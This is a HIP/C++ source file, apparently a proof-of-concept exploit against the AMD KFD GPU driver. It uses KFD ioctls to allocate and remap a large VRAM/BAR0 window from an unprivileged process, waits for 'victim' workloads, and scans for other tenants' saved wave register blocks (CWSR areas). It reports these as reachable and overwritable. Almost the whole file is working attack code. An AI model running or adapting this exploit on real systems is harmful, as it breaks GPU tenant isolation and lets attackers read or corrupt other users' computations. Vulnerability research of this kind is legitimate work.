/* F10/F13 x F14 combination — step 1: prove F14's VRAM window reaches OTHER
 * processes' CWSR save areas. Scan the 4 GiB window for wave hwreg-block
 * signatures (EXEC pair 0xFFFFFFFF at [k,k+1]; MODE 0x000003f0 at [k+6];
 * STATUS plausible at [k+2]). A hit = another tenant's saved wave registers,
 * reachable (and writable) from an unprivileged attacker.                    */
#define _GNU_SOURCE
#include <hip/hip_runtime.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <cerrno>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
extern "C" { 
#include <linux/kfd_ioctl.h>
}
#define GPU_ID 46235
static int kfd,drm;
static int find_drm_fd(){DIR*d=opendir("/proc/self/fd");struct dirent*e;char b[256],l[256];
 while((e=readdir(d))){snprintf(b,sizeof b,"/proc/self/fd/%s",e->d_name);
  ssize_t n=readlink(b,l,sizeof l-1);if(n<=0)continue;l[n]=0;
  if(!strcmp(l,"/dev/dri/renderD128")){closedir(d);return atoi(e->d_name);} } closedir(d);return -1;}
static int alloc_mem(uint64_t va,uint64_t sz,uint32_t fl,uint64_t in,uint64_t*h,uint64_t*out){
 struct kfd_ioctl_alloc_memory_of_gpu_args a;memset(&a,0,sizeof a);
 a.va_addr=va;a.size=sz;a.gpu_id=GPU_ID;a.flags=fl;a.mmap_offset=in;
 int r=ioctl(kfd,AMDKFD_IOC_ALLOC_MEMORY_OF_GPU,&a);
 if(!r){if(h)*h=a.handle;if(out)*out=a.mmap_offset;}return r;}
static int map_mem(uint64_t h){uint32_t d=GPU_ID;struct kfd_ioctl_map_memory_to_gpu_args m;
 memset(&m,0,sizeof m);m.handle=h;m.device_ids_array_ptr=(uintptr_t)&d;m.n_devices=1;
 return ioctl(kfd,AMDKFD_IOC_MAP_MEMORY_TO_GPU,&m)==0?(int)m.n_success:-1;}

/* scan window (as u32 array) for CWSR hwreg block signature */
__global__ void scan(unsigned long long base, unsigned long long dwords,
                     unsigned *hits, unsigned long long *offs, unsigned *samp, unsigned cap){
  unsigned long long stride=(unsigned long long)gridDim.x*blockDim.x;
  const volatile unsigned *p=(const volatile unsigned*)base;
  for(unsigned long long k=(unsigned long long)blockIdx.x*blockDim.x+threadIdx.x;
      k+10<dwords; k+=stride){
    if(p[k]==0xFFFFFFFFu && p[k+1]==0xFFFFFFFFu){       /* EXEC_lo/hi */
      unsigned mode=p[k+6];                              /* +0x18 from EXEC_lo = MODE */
      unsigned status=p[k+2];                            /* +0x08 from EXEC_lo = STATUS */
      /* MODE==0x3f0 and STATUS has VALID(16) set, PRIV(5)=0, plausible */
      if(mode==0x000003f0u && (status&0x10000u) && (status&0xffff0000u)!=0xffff0000u){
        unsigned s=atomicAdd(hits,1u);
        if(s<cap){ offs[s]=k*4ULL;
          if(s<8){ samp[s*4+0]=status; samp[s*4+1]=mode; samp[s*4+2]=p[k-1]; samp[s*4+3]=p[k+3];} }
      }
    }
  }
}
int main(int argc,char**argv){
  unsigned long long win=(argc>1?atoll(argv[1]):4090ULL)<<20;
  int waits=argc>2?atoi(argv[2]):0;
  unsigned*warm; hipMalloc(&warm,4096);
  drm=find_drm_fd(); kfd=open("/dev/kfd",O_RDWR);
  uint64_t hv,ov;
  if(alloc_mem(0x280000000000ULL,2ULL<<20,
      KFD_IOC_ALLOC_MEM_FLAGS_VRAM|KFD_IOC_ALLOC_MEM_FLAGS_PUBLIC|
      KFD_IOC_ALLOC_MEM_FLAGS_WRITABLE|KFD_IOC_ALLOC_MEM_FLAGS_NO_SUBSTITUTE,0,&hv,&ov)){
    printf("vram alloc fail: %s\n",strerror(errno));return 1;}
  volatile uint32_t*cpu=(volatile uint32_t*)mmap(NULL,2ULL<<20,PROT_READ|PROT_WRITE,MAP_SHARED,drm,(off_t)ov);
  cpu[0]=0x5A5AA5A5u;(void)cpu[0];
  uint64_t hb=0; const uint64_t VA=0x300000000000ULL;
  if(alloc_mem(VA,win,KFD_IOC_ALLOC_MEM_FLAGS_USERPTR|KFD_IOC_ALLOC_MEM_FLAGS_WRITABLE,
               (uint64_t)(uintptr_t)cpu,&hb,NULL)||map_mem(hb)<=0){
    printf("F14 window setup failed: %s\n",strerror(errno));return 1;}
  printf("F14 window: %llu MiB of BAR0 at GPU VA 0x%llx\n",win>>20,(unsigned long long)VA);
  if(waits){ printf("waiting %ds for victims to run compute...\n",waits); fflush(stdout); sleep(waits); }

  unsigned *d_hits,*d_samp; unsigned long long *d_offs; const unsigned CAP=100000;
  hipMalloc(&d_hits,4); hipMalloc(&d_offs,CAP*8); hipMalloc(&d_samp,8*4*4);
  hipMemset(d_hits,0,4); hipMemset(d_samp,0,8*4*4);
  printf("scanning %llu MiB for CWSR wave hwreg blocks...\n",win>>20);
  hipLaunchKernelGGL(scan,dim3(2048),dim3(256),0,0,(unsigned long long)VA,win/4,d_hits,d_offs,d_samp,CAP);
  if(hipDeviceSynchronize()!=hipSuccess){printf("scan faulted\n");return 1;}
  unsigned nh; hipMemcpy(&nh,d_hits,4,hipMemcpyDeviceToHost);
  printf("CWSR hwreg blocks found in window: %u\n",nh);
  if(nh){
    unsigned samp[32]; hipMemcpy(samp,d_samp,8*4*4,hipMemcpyDeviceToHost);
    unsigned long long offs[8]; hipMemcpy(offs,d_offs,8*8,hipMemcpyDeviceToHost);
    unsigned show=nh<6?nh:6;
    for(unsigned i=0;i<show;i++)
      printf("  +0x%09llx  STATUS=0x%08x MODE=0x%08x PChi~0x%08x EXEClo=0x%08x\n",
             offs[i],samp[i*4+0],samp[i*4+1],samp[i*4+2],samp[i*4+3]);
    printf("\n*** F14 window reaches CWSR save areas -> can overwrite another tenant's saved wave state ***\n");
  } else printf("no CWSR blocks in this window slice (try larger window / more victims / VRAM-vs-GTT)\n");
  return 0;
}
